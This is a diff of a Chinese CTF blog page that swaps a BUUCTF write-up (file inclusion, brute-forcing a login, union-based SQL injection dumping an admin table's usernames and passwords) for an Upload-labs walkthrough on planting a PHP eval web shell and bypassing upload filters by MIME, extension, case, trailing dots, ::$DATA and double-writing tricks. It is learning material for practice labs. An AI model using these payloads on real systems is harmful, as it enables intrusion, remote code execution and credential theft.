@@ -16,41 +16,47 @@
   <meta name="author" content="TEhS">
   <meta name="keywords" content="">
   
-    <meta name="description" content="LFI COURSE 1  if(isset($_GET[&#39;file&#39;])) &amp;#123; ... &amp;#125;：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。 $str &#x3D; $_GET[&#39;file&#39;];：将名为 ‘file’ 的 GET 参数的值存储在变量 $str 中。 include $_GET[&amp;#">
+    <meta name="description" content="Pass-01 创建一句话php   @：错误抑制符号，可以阻止PHP报告eval函数执行中的错误 eval：接受一个字符串作为参数，将其作为PHP代码执行 $_POST(&#39;shell&#39;)：POST请求变量，包含一个名为shell的参数  上传尝试  猜测是前端JS限制了上传文件的类型，直接禁用前端JS后，再次上传  上传成功，查看传输的路径  通过蚁剑进行连接  在根目录下即可找">
 <meta property="og:type" content="article">
-<meta property="og:title" content="BUUCTFWriteUp1">
-<meta property="og:url" content="http://example.com/2023/09/02/BUUCTFWriteUp1/index.html">
+<meta property="og:title" content="Upload_labs1">
+<meta property="og:url" content="http://example.com/2023/09/05/Upload-labs/index.html">
 <meta property="og:site_name" content="TEhS">
-<meta property="og:description" content="LFI COURSE 1  if(isset($_GET[&#39;file&#39;])) &amp;#123; ... &amp;#125;：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。 $str &#x3D; $_GET[&#39;file&#39;];：将名为 ‘file’ 的 GET 参数的值存储在变量 $str 中。 include $_GET[&amp;#">
+<meta property="og:description" content="Pass-01 创建一句话php   @：错误抑制符号，可以阻止PHP报告eval函数执行中的错误 eval：接受一个字符串作为参数，将其作为PHP代码执行 $_POST(&#39;shell&#39;)：POST请求变量，包含一个名为shell的参数  上传尝试  猜测是前端JS限制了上传文件的类型，直接禁用前端JS后，再次上传  上传成功，查看传输的路径  通过蚁剑进行连接  在根目录下即可找">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902094347903.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902102422665.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902102530889.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902103129156.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902103004685.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902103201354.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902103408791.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902150719714.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902163825700.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902163842513.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902170242985.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902170731553.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902171015321.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902171132043.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902171445924.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902171958351.png">
-<meta property="og:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902172038494.png">
-<meta property="article:published_time" content="2023-09-02T01:19:45.000Z">
-<meta property="article:modified_time" content="2023-09-05T02:43:57.110Z">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905105954741.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905110036360.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905110908269.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905111208945.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905111248987.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905111418459.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905111610103.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905111716152.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905113245564.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905133923792.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905134828992.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906131705456.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906131758825.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906135624141.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906140256010.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906142332590.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906143052256.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906143845354.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906144030007.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906150046786.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906150026942.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906153208872.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906153917267.png">
+<meta property="og:image" content="http://example.com/2023/09/05/Upload-labs/image-20230906154338920.png">
+<meta property="article:published_time" content="2023-09-05T02:58:39.000Z">
+<meta property="article:modified_time" content="2023-09-06T07:44:34.441Z">
 <meta property="article:author" content="TEhS">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png">
+<meta name="twitter:image" content="http://example.com/2023/09/05/Upload-labs/image-20230905105954741.png">
   
   
   
-  <title>BUUCTFWriteUp1 - TEhS</title>
+  <title>Upload_labs1 - TEhS</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -216,7 +222,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="BUUCTFWriteUp1"></span>
+            <span id="subtitle" data-typed-text="Upload_labs1"></span>
           
         </div>
 
@@ -227,8 +233,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-09-02 09:19" pubdate>
-          2023年9月2日 上午
+        <time datetime="2023-09-05 10:58" pubdate>
+          2023年9月5日 上午
         </time>
       </span>
     
@@ -239,7 +245,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.6k 字
+          1.1k 字
         
       </span>
     
@@ -250,7 +256,7 @@
         
         
         
-          14 分钟
+          10 分钟
         
       </span>
     
@@ -287,73 +293,70 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">BUUCTFWriteUp1</h1>
+            <h1 id="seo-header">Upload_labs1</h1>
             
             
               <div class="markdown-body">
                 
-                <p><strong>LFI COURSE 1</strong></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902093905518.png" srcset="/img/loading.gif" lazyload alt="image-20230902093905518"></p>
-<p><code>if(isset($_GET[&#39;file&#39;])) &#123; ... &#125;</code>：这是一个条件语句，用于检查是否存在名为 ‘file’ 的 GET 参数。如果存在，代码块内的内容将被执行。</p>
-<p><code>$str = $_GET[&#39;file&#39;];</code>：将名为 ‘file’ 的 GET 参数的值存储在变量 <code>$str</code> 中。</p>
-<p><code>include $_GET[&#39;file&#39;];</code>：这行代码尝试包含一个文件，文件名由 GET 参数 ‘file’ 的值指定</p>
-<p>用户可以通过GET参数来指定要包含的文件，include可能存在LFI（文件包含漏洞攻击）</p>
-<p>尝试?file&#x3D;&#x2F;flag   ?file&#x3D;&#x2F;flag.txt ?file&#x3D;&#x2F;flag.php </p>
-<p>?file&#x3D;&#x2F;flag可以直接得到flag</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902094347903.png" srcset="/img/loading.gif" lazyload alt="image-20230902094347903"></p>
-<p><strong>BRUTE 1</strong></p>
-<p>进入靶机后以下界面：</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102422665.png" srcset="/img/loading.gif" lazyload alt="image-20230902102422665"></p>
-<p>随意尝试组合用户名为123，password为123，返回“用户名错误”</p>
-<p>用burpsuite抓包可以得到以下信息</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902102530889.png" srcset="/img/loading.gif" lazyload alt="image-20230902102530889"></p>
-<p>根据题目意思Brute为野蛮的，推测为暴力破解，则选择send to Intruder，因为返回为“用户名错误”而不是“用户名或密码错误”，在尝试时，推测可以先确定用户名，再确定密码，不需要两边同时爆破</p>
-<p>所以构造：</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103129156.png" srcset="/img/loading.gif" lazyload alt="image-20230902103129156"></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103004685.png" srcset="/img/loading.gif" lazyload alt="image-20230902103004685"></p>
-<p>用户名字典和密码字典为网上下载，导入后选择Simple list，开始爆破</p>
-<p>当用户名为admin时：</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103201354.png" srcset="/img/loading.gif" lazyload alt="image-20230902103201354"></p>
-<p>所以修改payload：</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902103408791.png" srcset="/img/loading.gif" lazyload alt="image-20230902103408791"></p>
-<p>得到正确的值6490</p>
-<p>至此得到用户名为admin，密码为6490，输入可以得到flag</p>
-<p><strong>SQL COURSE 1</strong></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902150719714.png" srcset="/img/loading.gif" lazyload alt="image-20230902150719714"></p>
-<p>随便点击</p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163825700.png" srcset="/img/loading.gif" lazyload alt="image-20230902163825700"></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902163842513.png" srcset="/img/loading.gif" lazyload alt="image-20230902163842513"></p>
-<p>看到在访问backend&#x2F;content_detail.php?id&#x3D;1处，可能存在sql注入点，扔到HackBar中开始测试</p>
-<p>分别尝试<code>?id=1 and 1=1</code>和 <code>?id=1 and 1=2</code> 发现第一条有回显，第二条没有，判断为数字型注入</p>
-<p>判断or是否被过滤：</p>
-<p><code>?id=1 or 1=1</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170242985.png" srcset="/img/loading.gif" lazyload alt="image-20230902170242985"></p>
-<p>判断列数：</p>
-<p><code>?id=1 order by 1</code> 有回显</p>
-<p><code>?id=1 order by 2</code>有回显</p>
-<p><code>?id=1 order by 3</code>无回显</p>
-<p>所以表有两列</p>
-<p>确定字段的显示顺序</p>
-<p><code>?id=-1 union select 1,2</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902170731553.png" srcset="/img/loading.gif" lazyload alt="image-20230902170731553"></p>
-<p>爆破数据库：</p>
-<p><code>?id=-1 union select database(), database()</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171015321.png" srcset="/img/loading.gif" lazyload alt="image-20230902171015321"></p>
-<p>根据获得的数据库的名称，获取数据表的信息</p>
-<p><code>?id=-1 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;)</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171132043.png" srcset="/img/loading.gif" lazyload alt="image-20230902171132043"></p>
-<p><code>select group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39;</code>这部分会连接数据库中的所有表格名称，并以逗号分隔的形式返回。于是得到了表名信息admin, contents</p>
-<p>使用admin表，获取字段信息</p>
-<p><code>?id=-1 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;news&#39; and table_name=&#39;admin&#39;)</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171445924.png" srcset="/img/loading.gif" lazyload alt="image-20230902171445924"></p>
-<p>此处union select后的1作为占位符，使得结果可以对齐，括号中的查询语句可以获得news库admin表中的所有列名</p>
-<p>获取username</p>
-<p><code>?id=-1 union select 1,(select group_concat(username) from admin)</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902171958351.png" srcset="/img/loading.gif" lazyload alt="image-20230902171958351"></p>
-<p>获取密码</p>
-<p><code>?id=-1 union select 1,(select group_concat(password) from admin)</code></p>
-<p><img src="/2023/09/02/BUUCTFWriteUp1/image-20230902172038494.png" srcset="/img/loading.gif" lazyload alt="image-20230902172038494"></p>
-<p>根据得到的信息即可得到flag</p>
+                <h4 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h4><p><img src="/2023/09/05/Upload-labs/image-20230905105954741.png" srcset="/img/loading.gif" lazyload alt="image-20230905105954741"></p>
+<p><strong>创建一句话php</strong></p>
+<p><img src="/2023/09/05/Upload-labs/image-20230905110036360.png" srcset="/img/loading.gif" lazyload alt="image-20230905110036360"></p>
+<ul>
+<li><code>@</code>：错误抑制符号，可以阻止PHP报告eval函数执行中的错误</li>
+<li><code>eval</code>：接受一个字符串作为参数，将其作为PHP代码执行</li>
+<li><code>$_POST(&#39;shell&#39;)</code>：POST请求变量，包含一个名为shell的参数</li>
+</ul>
+<p><strong>上传尝试</strong></p>
+<p><img src="/2023/09/05/Upload-labs/image-20230905110908269.png" srcset="/img/loading.gif" lazyload alt="image-20230905110908269"></p>
+<p>猜测是前端JS限制了上传文件的类型，直接禁用前端JS后，再次上传</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230905111208945.png" srcset="/img/loading.gif" lazyload alt="image-20230905111208945"></p>
+<p>上传成功，查看传输的路径</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230905111248987.png" srcset="/img/loading.gif" lazyload alt="image-20230905111248987"></p>
+<p>通过蚁剑进行连接</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230905111418459.png" srcset="/img/loading.gif" lazyload alt="image-20230905111418459"></p>
+<p>在根目录下即可找到flag</p>
+<h4 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h4><p>依然通过一句话php木马进行尝试</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230905111610103.png" srcset="/img/loading.gif" lazyload alt="image-20230905111610103"></p>
+<p>通过Burpsuite进行抓包</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230905111716152.png" srcset="/img/loading.gif" lazyload alt="image-20230905111716152"></p>
+<p>Content-Type显示为text&#x2F;php，修改为image&#x2F;jpeg，重发</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230905113245564.png" srcset="/img/loading.gif" lazyload alt="image-20230905113245564"></p>
+<p>得到路径，其余操作与Pass-01相同</p>
+<p>利用该漏洞的关键函数：<code>mime_content_type()</code></p>
+<h4 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h4><p><img src="/2023/09/05/Upload-labs/image-20230905133923792.png" srcset="/img/loading.gif" lazyload alt="image-20230905133923792"></p>
+<p>基于黑名单绕过，通常方法有以下几种：</p>
+<ul>
+<li>上传不常见的php拓展名：pht, phpt, phtml, php3,php4,php5,php6</li>
+<li>有些会忽略大小写：Php，PHp，pHp之类的</li>
+<li>解析漏洞：例如apache，iis，nginx（需要继续了解，后续单独写博客）</li>
+</ul>
+<p><img src="/2023/09/05/Upload-labs/image-20230905134828992.png" srcset="/img/loading.gif" lazyload alt="image-20230905134828992"></p>
+<p>修改后缀即可</p>
+<h4 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h4><p><img src="/2023/09/05/Upload-labs/image-20230906131705456.png" srcset="/img/loading.gif" lazyload alt="image-20230906131705456"></p>
+<p>屏蔽了所有的拓展名，所以可以通过基于白名单的绕过进行文件上传：%00截断：在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230906131758825.png" srcset="/img/loading.gif" lazyload alt="image-20230906131758825"></p>
+<p>也可以通过上传.htaccess文件绕过</p>
+<h4 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h4><p><img src="/2023/09/05/Upload-labs/image-20230906135624141.png" srcset="/img/loading.gif" lazyload alt="image-20230906135624141"></p>
+<p>对比之前的题目，可以发现，少了将文件名全部转化成小写这一步，所以可以通过大小写混合进行绕过</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230906140256010.png" srcset="/img/loading.gif" lazyload alt="image-20230906140256010"></p>
+<h4 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h4><p><img src="/2023/09/05/Upload-labs/image-20230906142332590.png" srcset="/img/loading.gif" lazyload alt="image-20230906142332590"></p>
+<p>并未去除首尾的空格，可以通过添加空格的方式绕过</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230906143052256.png" srcset="/img/loading.gif" lazyload alt="image-20230906143052256"></p>
+<p>因为此时服务器获得的文件后缀是php+空格，不在黑明单中，所以可以实现绕过</p>
+<h4 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h4><p><img src="/2023/09/05/Upload-labs/image-20230906143845354.png" srcset="/img/loading.gif" lazyload alt="image-20230906143845354"></p>
+<p>代码中没有过滤点，可以通过加点进行绕过</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230906144030007.png" srcset="/img/loading.gif" lazyload alt="image-20230906144030007"></p>
+<p>此时，服务器获取到的后缀是空，不在黑名单中</p>
+<h4 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h4><p><img src="/2023/09/05/Upload-labs/image-20230906150046786.png" srcset="/img/loading.gif" lazyload alt="image-20230906150046786"></p>
+<p>源码没有过滤::DATA，可以利用windows的特性</p>
+<p>在window的时候如果文件名+<code>&quot;::$DATA&quot;</code>会把<code>::$DATA</code>之后的数据当成文件流处理,不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，目的就是不检查后缀名</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230906150026942.png" srcset="/img/loading.gif" lazyload alt="image-20230906150026942"></p>
+<h4 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153208872.png" srcset="/img/loading.gif" lazyload alt="image-20230906153208872"></p>
+<p>由于代码没有写循环，代表对于 <code>.</code> 和 <code> space</code>的过滤只会进行一遍，所以可以通过在后缀名后添加 <code>. .</code>来进行绕过</p>
+<h4 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h4><p><img src="/2023/09/05/Upload-labs/image-20230906153917267.png" srcset="/img/loading.gif" lazyload alt="image-20230906153917267"></p>
+<p><code>$file_name=str_ireplace($deny_file, &quot;&quot;, $file_name)</code>：函数调用会查找 <code>$file_name</code> 中包含在 <code>$deny_ext</code> 数组中的任何子字符串，然后将它们替换为空字符串，即删除这些子字符串</p>
+<p>所以可以通过双写进行绕过，在处理 <code>pphphp</code>时，由于上述函数，中间的php将被替换成空，该后缀仍然会被解析成php</p>
+<p><img src="/2023/09/05/Upload-labs/image-20230906154338920.png" srcset="/img/loading.gif" lazyload alt="image-20230906154338920"></p>
 
                 
               </div>
@@ -399,8 +402,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>BUUCTFWriteUp1</div>
-      <div>http://example.com/2023/09/02/BUUCTFWriteUp1/</div>
+      <div>Upload_labs1</div>
+      <div>http://example.com/2023/09/05/Upload-labs/</div>
     </div>
     <div class="license-meta">
       
@@ -412,7 +415,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年9月2日</div>
+          <div>2023年9月5日</div>
         </div>
       
       
@@ -444,18 +447,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/09/05/LFI/" title="LFI">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">LFI</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/07/27/ReadPaper2/" title="ReadPaper2">
-                        <span class="hidden-mobile">ReadPaper2</span>
+                      <a href="/2023/09/05/LFI/" title="LFI">
+                        <span class="hidden-mobile">LFI</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
